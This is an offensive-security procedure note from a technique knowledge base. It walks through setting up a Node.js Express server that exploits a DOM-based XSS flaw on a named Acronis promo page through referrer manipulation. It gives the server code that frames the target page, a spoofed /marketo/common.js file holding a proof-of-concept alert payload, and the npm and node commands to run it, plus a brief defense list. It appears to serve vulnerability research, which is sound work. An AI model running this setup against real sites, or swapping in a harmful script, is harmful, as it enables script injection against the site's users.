---
tags:
  - xss
  - server-setup
  - node-js
type: procedure
tools:
  - '[[tools/Node.js]]'
  - '[[tools/npm]]'
  - '[[tools/Express]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/npm-init-project]]'
  - '[[commands/npm-install-express]]'
  - '[[commands/node-run-server]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 8a76e2ca-0668-4657-9c20-ee2b64a1f32d
created_at: '2025-12-13T23:56:19.684Z'
updated_at: '2025-12-13T23:56:19.684Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Set-Up-Malicious-Express-Server-for-XSS

## Summary

This procedure sets up a local Node.js server using Express to host a malicious HTML page and JavaScript payload for exploiting DOM-based XSS via referrer manipulation. It initializes the project, installs dependencies, and starts the server to serve the attack resources.

## Description

In the context of the Acronis DOM-XSS vulnerability, the attacker needs a server to host an index.html with an iframe and a /marketo/common.js file containing malicious code. The server runs on localhost:5000, serving static files and the dynamic page that spoofs the referrer when the victim accesses it. Prerequisites include Node.js installed on the attacker's machine. Expected outcome: A running server ready to deliver the payload when the malicious page is visited.

## Requirements

1. Node.js runtime environment installed (version 14+ recommended)
2. npm package manager available
3. Local development setup with write access to a project directory
4. Basic knowledge of JavaScript and web servers

## Defense

Defensive measures and detection strategies:

- Implement Content Security Policy (CSP) to restrict script sources
- Validate and sanitize `document.referrer` before using in dynamic script loads
- Monitor for unexpected script loads from untrusted referrers in browser dev tools
- Use referrer-policy headers to limit referrer information exposure

## Objectives

1. Establish a controllable server for hosting XSS payload
2. Serve malicious JS mimicking the expected /marketo/common.js path
3. Enable referrer spoofing for exploitation

## Instructions

### Step 1: Create Project Directory and index.js

**Context**: Initialize the file structure for the Express server to serve the malicious page and script.

No command required; manually create a directory (e.g., `xss-server`) and add `index.js` with the following content:

```javascript
const express = require('express');
const path = require('path');
const app = express();
app.use(express.static('public'));
app.get('/', (req, res) => {
  res.send('<html><body><iframe src="https://promo.acronis.com/GL-Trial-MassTransit.html" style="width:100%; height:100vh;"></iframe></body></html>');
});
app.listen(5000, () => console.log('Server running on port 5000'));
```

Also create a `public/marketo/common.js` with `alert('XSS exploited!');`.

> This sets up serving of the iframe page at root and static JS at the expected path.

### Step 2: Initialize npm Project

**Context**: Create package.json for dependency management.

**Command** ([[commands/npm-init-project]]):
```bash
npm init -y
```

> Initializes the project with defaults, creating package.json. Expected output: WRN message if no README, but package.json created.

### Step 3: Install Express

**Context**: Add the web framework to handle HTTP serving.

**Command** ([[commands/npm-install-express]]):
```bash
npm i express
```

> Installs Express, updating package.json and creating node_modules. Expected output: Progress logs ending with "added X packages".

### Step 4: Start the Server

**Context**: Launch the server to begin hosting.

**Command** ([[commands/node-run-server]]):
```bash
node index.js
```

> Executes the server script. Expected output: "Server running on port 5000" in console.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/npm-init-project]]
- [[commands/npm-install-express]]
- [[commands/node-run-server]]

## Tools Used

- [[tools/Node.js]]
- [[tools/npm]]
- [[tools/Express]]

## Tags

- xss
- server-setup
